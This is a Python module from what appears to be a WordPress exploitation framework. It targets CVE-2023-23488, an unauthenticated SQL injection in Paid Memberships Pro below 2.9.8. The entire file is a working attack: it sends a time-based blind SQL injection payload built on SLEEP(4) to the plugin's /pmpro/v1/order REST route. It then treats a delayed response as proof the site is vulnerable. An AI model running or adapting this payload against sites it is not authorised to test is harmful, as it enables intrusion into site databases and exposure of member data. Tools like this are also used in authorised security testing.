import requests
from ...exploit import Exploit, CMS, Categorys
from ....config import Config
from ....handler.retry.retryrequest import RetryRequest

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class PaidMembership(Exploit):
    name = "Paid Memberships Pro < 2.9.8"
    cms = CMS.Wordpress
    category = Categorys.SQL
    cve = "CVE-2023-23488"

    def run(self, url):
        payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(4)))a)-- -"
        data = {'rest_route': '/pmpro/v1/order',
                'code': payload}

        check_requst = retry_request.retry(requests.get, f"{url}/wordpress", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}, params=data).elapsed.total_seconds()
        if check_requst >= 3:
            return True
        return False